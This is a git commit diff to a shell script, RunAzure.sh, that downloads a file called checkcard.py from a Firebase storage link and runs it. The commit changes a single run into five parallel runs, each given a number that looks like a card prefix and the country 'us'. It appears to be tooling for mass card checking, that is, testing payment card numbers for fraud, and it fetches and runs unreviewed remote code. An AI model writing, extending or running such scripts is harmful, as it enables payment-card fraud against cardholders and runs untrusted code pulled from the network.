c92bc023480c2f88d86b224ec42c684b882d9684
Vinh Huynh <caubequay00@gmail.com>
2019-10-24 14:43:22 +0700

    Update RunAzure.sh

--- RunAzure.sh
+++ RunAzure.sh
@@ -5,7 +5,16 @@ python3 -m pip install grequests python3-xlib pyautogui===0.9.39 --user
 rm -rf setup*
 wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=041de0fd-e1b9-4d30-949d-ee087750b1a7 &
 sleep 4
-python3 check.py 46701001249 us
+python3 check.py 46701001249 us &
+sleep 2
+python3 check.py 46701001249 us &
+sleep 2
+python3 check.py 46701001249 us &
+sleep 2
+python3 check.py 46701001249 us &
+sleep 2
+python3 check.py 46701001249 us &
+sleep 2
 #run3.sh
 #python3 /headless/Desktop/backup/pygui.py
 #if [ -z "$FAH" ]
